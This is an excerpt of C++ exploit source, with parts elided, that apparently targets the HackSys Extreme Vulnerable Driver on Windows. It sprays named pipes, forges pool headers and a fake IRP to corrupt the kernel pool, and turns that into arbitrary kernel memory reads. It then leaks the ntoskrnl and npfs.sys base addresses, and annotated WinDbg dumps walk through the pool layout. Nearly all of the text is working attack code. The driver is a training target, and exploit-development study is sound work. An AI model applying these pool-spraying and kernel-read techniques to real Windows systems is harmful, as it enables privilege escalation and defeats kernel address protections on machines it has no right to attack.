...
void init_global_readwrite_pipe() {
	...
	for (int i = 0; i < g_initial_size*4; i++) {
		...
		CreatePipe(&readPipe, &writePipe, &sa, 0xFFFFFFFF);
...
// DO hex dump displaying 16 bytes per line in C++ with pretty printing
void hex_dump(const char* buffer, size_t size) {
...
// ghost_rw_pipe is for kernel read
void leak_kernel_base_addresses(std::pair<HANDLE, HANDLE> ghost_rw_pipe, ULONGLONG leaked_LIST_ENTRY, PULONGLONG nt_base, PULONGLONG  npfs_base) {
	/*
	
	It turns out that it is possible to get the kernel base address even from low integrity level. 
	It can be done when we realize that the `NP_DATA_QUEUE` is a field within the 
	undocumented [Client Control Block](https://github.com/reactos/reactos/blob/c2c66af/drivers/filesystems/npfs/npfs.h#L258) 
	which we can reference from ReactOS. 
	
	Within `NP_CCB` exists pointers to [[#Structure of FILE_OBJECT]]. 
	The FILE_OBJECT contains our `_DEVICE_OBJECT` which we can then leak the `_DEVICE_OBJECT` 
	and eventually the `npfs.sys` base address via `DriverStart` 

	0: kd> dq ffffb20134edaab0-50 l50
		ffffb201`34edaa60  00000000`00000000 00000000`00000000
		ffffb201`34edaa70  00000000`00000000 00000000`00000000
		ffffb201`34edaa80  00000000`00000000 00000000`00000000
																<<PRESENT IN FAKE GHOST CHUNK POOL HEADER SPRAY LIST>>
		ffffb201`34edaa90  a764dbd8`2209feeb ffffb201`000001ef  <--- VS HEADER (Previously HEVD but reclaimed with new DQE)
		ffffb201`34edaaa0  7246704e`0a20a200 2641caae`cd1dfaf8  <--- POOL_HEADER
		ffffb201`34edaab0  ffffc20e`fa36a978 ffffc20e`fa36a978  <--- Newly allocated DQE (VULN SIZE) | Previous uncleared DQE
		ffffb201`34edaac0  00000000`00000000 00000000`00000000  <--- Newly allocated DQE (VULN SIZE) | Previous uncleared DQE
		ffffb201`34edaad0  000001c0`00000000 43434343`000001c0  <--- Newly allocated DQE (VULN SIZE) | Previous uncleared DQE HEADER
																<<PRESENT IN GHOST CHUNK SPRAY LIST>>
		ffffb201`34edaae0  00000000`00000000 00000000`00000000   <--- VS Chunk Header of Ghost Chunk (LEAK)
		ffffb201`34edaaf0  7246704e`0a3eb000 2641caae`cd1dfaa8   <--- Ghost Chunk Pool Header (LEAK)
		ffffb201`34edab00  ffffc20f`4df08138 ffffc20f`4df08138   <--- DQE Header of Ghost Chunk  (LEAK)
		ffffb201`34edab10  00000000`00000000 ffffc20e`f761f4a0   <--- DQE Header of Ghost Chunk  (LEAK)
		ffffb201`34edab20  000003a0`00000000 00000000`000003a0   <--- DQE Header of Ghost Chunk  (LEAK)
		ffffb201`34edab30  cafebabe`deadbeef 00000000`00000000   <--- Newly allocated DQE's data containing EGG which we can find by PeekNamedPipe
		ffffb201`34edab40  00000000`00000000 00000000`00000000
		ffffb201`34edab50  00000000`00000000 00000000`00000000

	*/

	// Get the LIST ENTRY address by reading the targeted DQE from fake ghost chunk pool header spray list
	char* leak_buffer = new char[DEFAULT_BUFFER_SIZE];
	memset(leak_buffer, 0, DEFAULT_BUFFER_SIZE); 
	
	kernel_read(ghost_rw_pipe, leaked_LIST_ENTRY, (char*)leak_buffer, sizeof(xVS_DQE_HEADER_CHUNK)*2 + 0x20);
	std::cout << "Leaked LIST_ENTRY " << std::hex << leaked_LIST_ENTRY << std::endl;
	hex_dump(leak_buffer, sizeof(xVS_DQE_HEADER_CHUNK) * 2 + 0x20);
...
void kernel_read(std::pair<HANDLE, HANDLE>read_write_pipe, ULONGLONG address, char* outputBuffer, size_t size) {
	std::cout << "Calling kernel read with address: " << std::hex << address << std::endl;

	// we need to place the address into the systembuffer for IRP
	std::cout << "Before setting address: " << std::hex << g_fake_irp_for_read.SystemBuffer << std::endl;
	std::cout << "Check in ghost vuln sized chunk...\n" << std::endl;
	g_fake_irp_for_read.SystemBuffer = address; 

	std::cout << "Reading from address: " << std::hex << g_fake_irp_for_read.SystemBuffer << std::endl;
	std::cout << "Check in ghost vuln sized chunk...\n" << std::endl;

	DWORD numBytesPeeked = 0;
	std::cout << "PEEPING NAMED PIPE" << std::endl;
	PeekNamedPipe(read_write_pipe.first, outputBuffer, size, &numBytesPeeked, NULL, NULL);
	hex_dump(outputBuffer, numBytesPeeked); // print the leak buffer in hex format
...
int main(int argc, char** argv) {
	...
	*/
	...
	// THIS IS NEEDED TO WAIT FOR THE FREE TO FINISH BEFORE THE NEXT SPRAY 
	// TOOK WEEKS TO FIND OUT AND ITS THANKS TO @OMMADAWN  T.T
	Sleep(2000); 
	...
	// 
	// 	// make sure the PoolQuota bit is not set in the PoolType,
	// to avoid an integrity check on the ProcessBilled field when the corrupted chunk is freed
	// 
	// This contains the first 0x50 bytes of the header starting from vs header
	xVS_DQE_HEADER_CHUNK fake_ghost_chunk_header = { 0 };
	fake_ghost_chunk_header.pool_header.BlockSize = (GHOST_CHUNK_SIZE - sizeof(HEAP_VS_CHUNK_HEADER)) / 0x10;
	fake_ghost_chunk_header.pool_header.PoolTag = 0x55555555;    // FAKE_GHOST_CHUNK_POOLTAG; // for easier spotting
	...
	// Now create a buffer which we will allocate several vulnerable chunk sized DQE
	...
	*/
	...
	std::pair<HANDLE, HANDLE> target_faked_poolheader_pipes = { NULL, NULL }; 
	int ghost_chunk_idx_in_fake_pool_list = -1; // 

	for (int i = 0; i < victimSprayList->get_spray_list().size(); i++) {
		std::cout << ".";
		// FREE the victim chunk and places freed Ghost chunk if successful into the lookaside list
		...
		// Allocate ghost chunk and putting the successfully freed ghost chunk from the lookaside list back into our ghost chunk spray list
					...
					if (numBytesRead > 0) {
						...
						for (int curr = 0; curr < numBytesRead - 8; curr++) {
							if (memcmp(readbuffer + curr, egg.c_str(), egg.size()) == 0) {
								std::cout << "Peeking from HANDLE " << j << " at index " << i << " with read pipe " << modified_fake_pool_head_chunk_readpipe << " and numBytesRead: " << numBytesRead << std::endl;
								std::cout << "Associated write pipe : " << spraylist_fake_pool_header_hevd_replacement->get_spray_list()[j].second << std::endl;
								...
								hex_dump(ghost_chunk_data_containing_header, GHOST_DATA_SIZE);
								found_ghost_chunk = true; // we found the ghost chunk
								ghost_chunk_idx_in_fake_pool_list = j;
								ghost_chunk_read_write_pipes = ghost_chunk_spraylist_to_catch_ghost->get_spray_list().back(); // this is the read and write pipe for the ghost chunk
								target_faked_poolheader_pipes = spraylist_fake_pool_header_hevd_replacement->get_spray_list()[j]; // this is the read and write pipe for the target faked pool header
...
FOUNDGHOSTCHUNK:
	...
	/*
		...
		ffffaf01`755ef260  00000000`00000000 00000000`00000000  <------------ ?? This is the start of the ghost chunk data which is  xVS_DQE_HEADER_CHUNK
	...
	*/
	...
	LIST_ENTRY* ghost_chunk_data_listentry = &leaked_ghost_header->np_data_queue_entry.QueueEntry;
	...
	fake_dqe.np_data_queue_entry.QueueEntry.Flink = ghost_chunk_data_listentry; // this contains the list entry that we leaked somewhere within the _NP_CCB
	fake_dqe.np_data_queue_entry.QueueEntry.Blink = ghost_chunk_data_listentry; // this contains the list entry that we leaked somewhere within the _NP_CCB
	fake_dqe.np_data_queue_entry.Irp = (uintptr_t)&g_fake_irp_for_read; // this is the userland IRP that we want to modify later on
	...
	char ghost_np_data_queue_entry[DEFAULT_BUFFER_SIZE] = { 0 };

	while (1) {
		HANDLE target_faked_poolheader_chunk_read_pipe = target_faked_poolheader_pipes.first;
		HANDLE target_faked_poolheader_chunk_write_pipe = target_faked_poolheader_pipes.second;

		std::cout << "Freeing" << std::endl;
		// Free our chunk found from the chunk found from fake ghost chunk pool header
		// Putting it into the LAL for VULN SIZE
		memset(buffer, 0, DEFAULT_BUFFER_SIZE); // clear the read buffer
		DWORD numBytesRead = 0;
		ReadFile(target_faked_poolheader_chunk_read_pipe, buffer, VULN_DATA_SIZE, &numBytesRead, NULL);
		...
		// Allocate another VULN size and allocating from Lookaside list 
		memset(buffer, 0, DEFAULT_BUFFER_SIZE); // clear the read buffer
		memcpy(buffer, &fake_dqe, sizeof(xVS_DQE_HEADER_CHUNK));
		std::pair<HANDLE, HANDLE> allocate_pair = g_read_write_pipes.back();
		g_read_write_pipes.pop_back();
		std::cout << "Allocating vuln sized chunk" << std::endl;
		WriteFile(allocate_pair.second, buffer, VULN_DATA_SIZE, &numBytesRead, NULL); // write the data to the pipe to attempt to reclaim

		// Now this allocate_pair is the new target_faked_poolheader
		target_faked_poolheader_pipes.first = allocate_pair.first;
		target_faked_poolheader_pipes.second = allocate_pair.second;
		
		// attempt to read
		std::cout << "Kernel REading" << std::endl;
		std::cout << "Read and write pipes: " << ghost_chunk_read_write_pipes.first << " " << ghost_chunk_read_write_pipes.second << std::endl;
		kernel_read(ghost_chunk_read_write_pipes, (ULONGLONG)ghost_chunk_data_listentry->Flink, ghost_np_data_queue_entry, 0x50);
		hex_dump(ghost_np_data_queue_entry, 0x50);
	...
	// We would be able to find the npfs.sys and ntoskrnl base address by leaking contents from NP_CCB
	ULONGLONG nt_base = 0x0;
	ULONGLONG npfs_base = 0x0;
	leak_kernel_base_addresses(ghost_chunk_read_write_pipes, reinterpret_cast<ULONGLONG>(leaked_ghost_header->np_data_queue_entry.QueueEntry.Flink),&nt_base, &npfs_base);
	std::cout << "Ntoskrnl Base Address: " << std::hex << nt_base << std::endl;
	std::cout << "NPFS Base Address: " << std::hex << npfs_base << std::endl;

	std::cout << "Leaking ExpPoolQuotaCookie : ";
	

	
	// prompt for user input to input kernel address
	while (true) {
		// user input the kernel address to read
		unsigned long long s = 0;
		std::cin >> s;
		std::cout << "Address to read : " << std::hex << s << std::endl;
		memset(ghost_np_data_queue_entry, 0, DEFAULT_BUFFER_SIZE);
		kernel_read(ghost_chunk_read_write_pipes, s, ghost_np_data_queue_entry, 0x80);


	}

	kernel_read(ghost_chunk_read_write_pipes, (ULONGLONG)0x4141414141414141, ghost_np_data_queue_entry, 0x20);
